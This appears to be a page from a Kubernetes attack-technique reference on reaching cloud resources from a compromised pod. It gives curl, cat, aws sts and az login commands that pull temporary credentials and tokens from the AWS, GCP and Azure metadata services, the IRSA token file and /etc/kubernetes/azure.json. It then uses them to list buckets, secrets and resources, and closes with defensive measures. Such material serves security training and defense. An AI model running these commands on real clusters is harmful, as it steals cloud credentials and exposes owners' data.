# Accessing Cloud Resources

An attacker who has gained access to a pod running inside a cloud-managed Kubernetes cluster can leverage the node's or pod's attached cloud identity to reach external cloud resources such as object storage, databases, and secret managers — without any additional credentials.

> **Note:** This technique requires a cloud-managed Kubernetes cluster and cannot be fully demonstrated on a local Kind cluster.

## Description

If the Kubernetes cluster is deployed in the cloud, attackers can leverage their access to a single container to get access to other cloud resources outside the cluster. Cloud providers attach IAM identities to nodes or pods to allow workloads to interact with cloud APIs. When misconfigured, these identities can be abused by any process running inside a pod.

Examples include:

- **AWS (EKS)**: EC2 instance profile credentials are available via the Instance Metadata Service (IMDS) at `http://169.254.169.254`. EKS also supports IAM Roles for Service Accounts (IRSA), where a pod's ServiceAccount is annotated with an IAM role ARN.
- **GCP (GKE)**: The metadata server at `http://metadata.google.internal` exposes access tokens for the node's GCP service account. GKE Workload Identity maps Kubernetes ServiceAccounts to GCP service accounts.
- **Azure (AKS)**: Each node stores a managed identity or service principal credentials. AKS nodes may have Managed Identity assigned at the VM level. The credentials file is often located at `/etc/kubernetes/azure.json`.

Also, AKS has an option to authenticate with Azure using a service principal. When this option is enabled, each node stores service principal credentials that are located in `/etc/kubernetes/azure.json`. AKS uses this service principal to create and manage Azure resources that are needed for the cluster operation. By default, the service principal has contributor permissions in the cluster's Resource Group. Attackers who get access to this service principal file (by hostPath mount, for example) can use its credentials to access or modify the cloud resources.

## Prerequisites

- Access to a running pod in a cloud-managed Kubernetes cluster (EKS, GKE, or AKS).
- The pod must be scheduled on a node with a cloud IAM identity attached.
- `kubectl` installed and configured to exec into pods.

## Quick Start (Conceptual Walkthrough)

### AWS — Querying the EC2 Instance Metadata Service

From inside any pod on an EKS node, an attacker queries the IMDS to retrieve temporary AWS credentials:

```bash
# Retrieve the IAM role name assigned to the node
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Retrieve the temporary credentials for the role
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
```

Example response:

```json
{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2026-04-01T12:00:00Z"
}
```

Use the credentials to access AWS resources:

```bash
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# List all S3 buckets accessible with these credentials
aws s3 ls

# Access secrets from AWS Secrets Manager
aws secretsmanager list-secrets --region us-east-1
```

### AWS — Abusing IRSA (IAM Roles for Service Accounts)

If the pod uses IRSA, the projected service account token is available at a well-known path:

```bash
# The token is mounted automatically by the EKS pod identity webhook
cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token

# Exchange the token for AWS credentials using STS
aws sts assume-role-with-web-identity \
  --role-arn arn:aws:iam::<ACCOUNT_ID>:role/<ROLE_NAME> \
  --role-session-name attacker-session \
  --web-identity-token file:///var/run/secrets/eks.amazonaws.com/serviceaccount/token
```

### GCP — Querying the GKE Metadata Server

From inside any pod on a GKE node:

```bash
# List service accounts available on the node
curl -s -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/

# Retrieve an access token for the default service account
curl -s -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

Use the token to call Google Cloud APIs:

```bash
TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

# List GCS buckets
curl -s -H "Authorization: Bearer $TOKEN" \
  https://storage.googleapis.com/storage/v1/b?project=<PROJECT_ID>
```

### Azure — Reading the Service Principal from the Node

If the pod has a `hostPath` mount to `/etc/kubernetes/` or the attacker has escaped to the node:

```bash
# Read the AKS service principal or managed identity configuration
cat /etc/kubernetes/azure.json
```

Example fields of interest:

```json
{
  "tenantId": "...",
  "subscriptionId": "...",
  "aadClientId": "...",
  "aadClientSecret": "...",
  "resourceGroup": "...",
  "location": "eastus"
}
```

Use the credentials to authenticate with Azure:

```bash
az login --service-principal \
  --username <aadClientId> \
  --password <aadClientSecret> \
  --tenant <tenantId>

# List resources in the cluster's resource group
az resource list --resource-group <resourceGroup>
```

### Azure — Querying IMDS for Managed Identity

```bash
# Retrieve an access token for the node's managed identity
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

## Defense Considerations

- Enable IMDSv2 on AWS (requires session-oriented requests, mitigating SSRF-based attacks).
- Use GKE Workload Identity and disable legacy metadata endpoints.
- Restrict pod-level access with network policies that block `169.254.169.254`.
- Apply the principle of least privilege to all node and pod IAM roles.
- Avoid mounting `/etc/kubernetes/` or other sensitive host paths into pods.

## Resources

- [AKS Service Principals](https://learn.microsoft.com/en-us/azure/aks/kubernetes-service-principal)
- [Extracting Credentials from Azure Kubernetes Service](https://www.netspi.com/blog/technical/cloud-penetration-testing/extract-credentials-from-azure-kubernetes-service/)
- [AWS IMDS and IRSA](https://docs.aws.amazon.com/eks/latest/userguide/iam-roles-for-service-accounts.html)
- [GKE Workload Identity](https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity)
- [Hacking the Cloud — AWS Metadata](https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/)
